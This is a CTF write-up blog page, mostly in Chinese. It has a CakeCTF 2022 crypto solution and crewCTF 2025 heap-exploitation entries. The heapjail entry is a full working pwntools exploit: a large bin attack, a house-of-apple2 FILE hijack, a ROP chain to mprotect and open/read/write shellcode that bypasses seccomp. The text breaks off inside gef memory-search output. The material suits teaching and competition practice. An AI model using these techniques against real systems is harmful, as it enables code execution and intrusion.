        <h1 id="2022-Cakectf"><a href="#2022-Cakectf" class="headerlink" title="2022 Cakectf"></a>2022 Cakectf</h1><h2 id="frozencake-crypto"><a href="#frozencake-crypto" class="headerlink" title="frozencake-crypto"></a>frozencake-crypto</h2><p>$$<br>\begin{align*}<br>&amp; m^p \equiv a \mod{n} \<br>&amp; m^q \equiv b \mod{n} \<br>&amp; m^n \equiv c \mod{n} \<br>&amp; n &#x3D; p<em>q \<br>&amp; \varphi(n)&#x3D;(p-1)</em>(q-1)\<br>\<br>&amp; m^{(p-1)<em>(q-1)} \equiv 1 \mod{n}\<br>&amp; m^{pq-p-q+1} \equiv 1 \mod{n}  \<br>&amp; \Longrightarrow  \frac{mc}{ab}  \equiv1 \mod{n} \<br>&amp; \Longrightarrow  m &#x3D; \frac{ab}{c} \mod{n} \<br>&amp; \Longrightarrow  m &#x3D; abc^{\varphi{(n)}-1} % n \<br>\end{align</em>}<br>$$</p>
<p>其中$c^{-1} %n$可以通过<code>pow(c,-1,n)</code>直接进行计算，python3.9支持</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">101205131618457490641888226172378900782027938652382007193297646066245321085334424928920128567827889452079884571045344711457176257019858157287424646000972526730522884040459357134430948940886663606586037466289300864147185085616790054121654786459639161527509024925015109654917697542322418538800304501255357308131</span></span><br><span class="line">a = <span class="number">38686943509950033726712042913718602015746270494794620817845630744834821038141855935687477445507431250618882887343417719366326751444481151632966047740583539454488232216388308299503129892656814962238386222995387787074530151173515835774172341113153924268653274210010830431617266231895651198976989796620254642528</span></span><br><span class="line">b = <span class="number">83977895709438322981595417453453058400465353471362634652936475655371158094363869813512319678334779139681172477729044378942906546785697439730712057649619691929500952253818768414839548038664187232924265128952392200845425064991075296143440829148415481807496095010301335416711112897000382336725454278461965303477</span></span><br><span class="line">c = <span class="number">21459707600930866066419234194792759634183685313775248277484460333960658047171300820279668556014320938220170794027117386852057041210320434076253459389230704653466300429747719579911728990434338588576613885658479123772761552010662234507298817973164062457755456249314287213795660922615911433075228241429771610549</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(a*b*<span class="built_in">pow</span>(c,-<span class="number">1</span>,n)%n))</span><br><span class="line"><span class="comment"># CakeCTF&#123;oh_you_got_a_tepid_cake_sorry&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/11/19/cakectf2022/" data-id="cuidswYz7R7AHoXraqg19pyT5" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2025crewctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/11/19/2025crewctf/" class="article-date">
  <time class="dt-published" datetime="2025-11-19T12:58:10.479Z" itemprop="datePublished">2025-11-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="crewCTF2025"><a href="#crewCTF2025" class="headerlink" title="crewCTF2025"></a>crewCTF2025</h1><p>[TOC]</p>
<h2 id="heapjail-pwn"><a href="#heapjail-pwn" class="headerlink" title="heapjail-pwn"></a>heapjail-pwn</h2><p>large bin attack 打 <code>_IO_list_all</code></p>
<p>然后走house of apple2 ORW</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    HOST,PORT = <span class="string">&quot;heap-jail.chal.crewc.tf&quot;</span>, <span class="number">1337</span></span><br><span class="line">    p = remote(HOST, PORT, ssl=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">elif</span> args.LOCAL:</span><br><span class="line">    p = process(<span class="string">&quot;./main-patch&quot;</span>)</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">ii = <span class="keyword">lambda</span> x: p.sendlineafter(<span class="string">&#x27; \n&#x27;</span>,x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz</span>):</span><br><span class="line">    ii(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    ii(<span class="built_in">str</span>(idx))</span><br><span class="line">    ii(<span class="built_in">str</span>(sz))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,cnt</span>):</span><br><span class="line">    ii(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    ii(<span class="built_in">str</span>(idx))</span><br><span class="line">    s(<span class="string">&#x27; \n&#x27;</span>, cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    ii(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    ii(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    ii(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    ii(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x408</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recv(<span class="number">0x10</span>)</span><br><span class="line">a = p.recv(<span class="number">0x3f8</span>)</span><br><span class="line"><span class="comment"># embed()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    libc = <span class="built_in">int</span>(a.strip().split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">2</span>].split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">0</span>].split(<span class="string">b&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">elif</span> args.LOCAL:</span><br><span class="line">    libc = <span class="built_in">int</span>(a.strip().split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">8</span>].split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">0</span>].split(<span class="string">b&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;@ libc: &quot;</span>+<span class="built_in">hex</span>(libc))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap = (u64(p.recv(<span class="number">8</span>))&lt;&lt;<span class="number">12</span>)-<span class="number">0x3000</span></span><br><span class="line">log.success(<span class="string">&quot;@ heap: &quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">_lock = libc+<span class="number">0x205700</span></span><br><span class="line">fake = heap+<span class="number">0x4bd0</span></span><br><span class="line"></span><br><span class="line">f1 = IO_FILE_plus_struct()</span><br><span class="line">f1._lock = _lock</span><br><span class="line">f1._wide_data = fake+<span class="number">0xe0</span></span><br><span class="line">f1.vtable = libc+<span class="number">0x202228</span> <span class="comment"># _IO_wfile_jumps</span></span><br><span class="line">f1._IO_save_base = fake+<span class="number">0x280</span></span><br><span class="line"></span><br><span class="line">svcudp_reply = libc+<span class="number">0x17923d</span></span><br><span class="line">swapcontext = libc+<span class="number">0x5815d</span></span><br><span class="line">pop_rdi = libc+<span class="number">0x10f75b</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = libc+<span class="number">0x110a4d</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">ret = libc+<span class="number">0x582bb</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> line  CODE  JT   JF      K</span></span><br><span class="line"><span class="string">=================================</span></span><br><span class="line"><span class="string"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span></span><br><span class="line"><span class="string"> 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015</span></span><br><span class="line"><span class="string"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span></span><br><span class="line"><span class="string"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span></span><br><span class="line"><span class="string"> 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015</span></span><br><span class="line"><span class="string"> 0005: 0x15 0x01 0x00 0x00000000  if (A == read) goto 0007</span></span><br><span class="line"><span class="string"> 0006: 0x15 0x00 0x06 0x00000001  if (A != write) goto 0013</span></span><br><span class="line"><span class="string"> 0007: 0x20 0x00 0x00 0x0000001c  A = args[1] &gt;&gt; 32</span></span><br><span class="line"><span class="string"> 0008: 0x25 0x05 0x00 0x00006146  if (A &gt; 0x6146) goto 0014</span></span><br><span class="line"><span class="string"> 0009: 0x15 0x00 0x04 0x00006146  if (A != 0x6146) goto 0014</span></span><br><span class="line"><span class="string"> 0010: 0x20 0x00 0x00 0x00000018  A = args[1]</span></span><br><span class="line"><span class="string"> 0011: 0x35 0x00 0x02 0xcad5b000  if (A &lt; 0xcad5b000) goto 0014</span></span><br><span class="line"><span class="string"> 0012: 0x35 0x01 0x00 0xcad7c000  if (A &gt;= 0xcad7c000) goto 0014</span></span><br><span class="line"><span class="string"> 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span></span><br><span class="line"><span class="string"> 0014: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS</span></span><br><span class="line"><span class="string"> 0015: 0x06 0x00 0x00 0x00000000  return KILL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    mov rdi, 0x67616c662f</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    mov rsi, rdi</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">data = flat(&#123;</span><br><span class="line">    <span class="number">0x20</span>: <span class="built_in">bytes</span>(f1)[<span class="number">0x30</span>:],</span><br><span class="line">    <span class="number">0xe0</span>: &#123;  <span class="comment"># _wide_data-&gt;_wide_vtable</span></span><br><span class="line">        <span class="number">0x18</span>: <span class="number">0</span>,  <span class="comment"># f-&gt;_wide_data-&gt;_IO_write_base</span></span><br><span class="line">        <span class="number">0x30</span>: <span class="number">0</span>,  <span class="comment"># f-&gt;_wide_data-&gt;_IO_buf_base</span></span><br><span class="line">        <span class="number">0xe0</span>: fake + <span class="number">0x200</span>&#125;,</span><br><span class="line">    <span class="number">0x200</span>: &#123;<span class="number">0</span>: asm(shellcode), <span class="number">0x68</span>: svcudp_reply&#125;,</span><br><span class="line">    <span class="number">0x280</span>: &#123;</span><br><span class="line">        <span class="number">0x18</span>: fake + <span class="number">0x280</span>,</span><br><span class="line">        <span class="number">0x28</span>: swapcontext,</span><br><span class="line">        <span class="number">0x88</span>: <span class="number">7</span>,</span><br><span class="line">        <span class="number">0xe0</span>: fake,</span><br><span class="line">        <span class="number">0xa0</span>: fake + <span class="number">0x380</span>,</span><br><span class="line">        <span class="number">0xa8</span>: ret&#125;,</span><br><span class="line">    <span class="number">0x380</span>: flat(</span><br><span class="line">        pop_rdi,</span><br><span class="line">        (fake // <span class="number">0x1000</span>) * <span class="number">0x1000</span>,</span><br><span class="line">        pop_rsi,</span><br><span class="line">        <span class="number">0x2000</span>,</span><br><span class="line">        libc+<span class="number">0x125c10</span>, <span class="comment"># mprotect</span></span><br><span class="line">        fake + <span class="number">0x200</span>,</span><br><span class="line">    )&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x4e0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xff8</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x4d0</span>)</span><br><span class="line">edit(<span class="number">2</span>, data.ljust(<span class="number">0x4d0</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x600</span>)</span><br><span class="line">edit(<span class="number">0</span>, flat([libc+<span class="number">0x203F40</span>, libc+<span class="number">0x203F40</span>, heap+<span class="number">0x36d0</span>, libc+<span class="number">0x2044c0</span>-<span class="number">0x20</span>])) <span class="comment"># _IO_list_all</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.LOCAL:</span><br><span class="line">    gdb.attach(p, <span class="string">f&#x27;break-rva 0x1B78\ndirectory ~/glibc-2.39\nb __GI__IO_wfile_overflow&#x27;</span>)<span class="comment">#\n hb *&#123;fake+0x200&#125;&#x27;)</span></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger exit</span></span><br><span class="line">ii(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">ii(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># crew&#123;L4rg3B1ns_FTW_f70c8418155de82fae43&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="heapbanding-pwn"><a href="#heapbanding-pwn" class="headerlink" title="heapbanding-pwn"></a>heapbanding-pwn</h2><p>题目中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wsl@sockholm:/mnt/d/DESKTOP/crewctf/heapbanging$ checksec ./heap-banging</span><br><span class="line">[*] <span class="string">&#x27;/mnt/d/DESKTOP/crewctf/heapbanging/heap-banging&#x27;</span></span><br><span class="line">    Arch:       amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    RUNPATH:    <span class="string">b&#x27;.&#x27;</span></span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>漏洞是一个明显的off-by-one</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( buf[v7] )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sing along: &quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf[v7], <span class="number">0x7Au</span>);              <span class="comment">// overwrite</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>暴力搜索内存，找到0x80</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; search-pattern --hex-regex <span class="string">&quot;8[0-9a-f]00000000000000&quot;</span> <span class="number">0x0000763cbe7cc000</span><span class="number">-0x0000763cbe7d2000</span></span><br><span class="line">[+] Searching <span class="keyword">for</span> <span class="string">&#x27;8[0-9a-f]00000000000000&#x27;</span> in <span class="number">0x763cbe7cc000</span><span class="number">-0x763cbe7d2000</span></span><br><span class="line">  <span class="number">0x763cbe7ceea0</span>:    <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  ................  |</span><br><span class="line">gef&gt; search-pattern --hex-regex <span class="string">&quot;7[0-9a-f]00000000000000&quot;</span> <span class="number">0x0000763cbe7cc000</span><span class="number">-0x0000763cbe7d2000</span></span><br><span class="line">[+] Searching <span class="keyword">for</span> <span class="string">&#x27;7[0-9a-f]00000000000000&#x27;</span> in <span class="number">0x763cbe7cc000</span><span class="number">-0x763cbe7d2000</span></span><br><span class="line">  <span class="number">0x763cbe7cc18d</span>: &lt;*ABS*@got.plt<span class="number">+0x5</span>&gt;    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc45d</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc495</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc4cd</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc505</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc53d</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc575</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc5ad</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc5e5</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc61d</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc655</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc68d</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc6c5</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc725</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc775</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc865</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc965</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cc9c5</span>: &lt;_IO_2_1_stdin_<span class="number">+0x45</span>&gt;    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cca25</span>: 